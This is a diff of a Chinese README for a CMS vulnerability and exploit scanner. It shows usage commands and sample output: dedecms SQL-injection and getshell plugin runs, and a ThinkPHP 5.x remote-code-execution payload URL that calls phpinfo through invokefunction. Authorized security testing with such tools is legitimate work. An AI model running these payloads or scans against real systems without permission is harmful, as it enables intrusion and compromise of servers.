@@ -12,29 +12,18 @@ ___
   - ~~[ShellFrameworkd](https://github.com/1oid/Shell-Frameworkd)批量扫描将会再之后修改为支持Python3~~
   - `ShellFrameworkd`已更名为[PocBatch-M](https://github.com/1oid/PocBatch-M)并支持了Python3
   - 更新pocsuite3插件调用 20211116
+  - 更新算法，新增颜色 20220301
 
 + 使用说明
-`python3 scan.py -u "http://43.*.*.*" -c dedecms`
+`python3 scan.py -u "http://43.*.*.*" -m dedecms`
 ```
-[*] Load Plugin dedecms_info_ver_txt.py
-[Success!!!] TimeStamp: 20170405, Possible Version: V5.7SP1
-[*] Load Plugin dedecms_sql_search_php.py
-[-] Execute Fail!
-[*] Load Plugin dedecms_sql_guestbook_php.py
-[-] Execute Fail!
-[*] Load Plugin dedecms_sql_download_2.py
-[-] Execute Fail!
-[*] Load Plugin dedecms_info_mysqli_error_inc.py
-[Success!!!] dedecms error info:http://43.*.*.*/data/mysqli_error_trace.inc
-[*] Load Plugin dede_backup_short_name.py
-[-] Execute Fail!
-[*] Load Plugin dedecms_getshell_install_php.py
-[-] Execute Fail!
-[*] Load Plugin dedecms_info_mysql_error_inc.py
-[Success!!!] http://43.*.*.*/data/mysql_error_trace.inc
-[*] Load Plugin dedecms_sql_recmomend_php.py
-[-] Execute Fail!
-[*] Load Plugin dedecms_redirect_download_php.py
+➜  cms_poc_exp_dev git:(dev) ✗ python3 newscan.py -u "http://localhost:8080" -m thinkphp
+[INFO] loaded exploits folder 31
+[INFO] loaded 4 plugins for thinkphp
+[NOT] check thinkphp_5_0_to_23_rce_captcha_poc2 not vulnerability
+[NOT] check thinkphp_5_0_to_23_rce_captcha not vulnerability
+[FIND] [ThinkphpRCE] http://localhost:8080?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
+[NOT] check thinkphp_5_0_to_20_rce_captcha not vulnerability
 ```
 
 
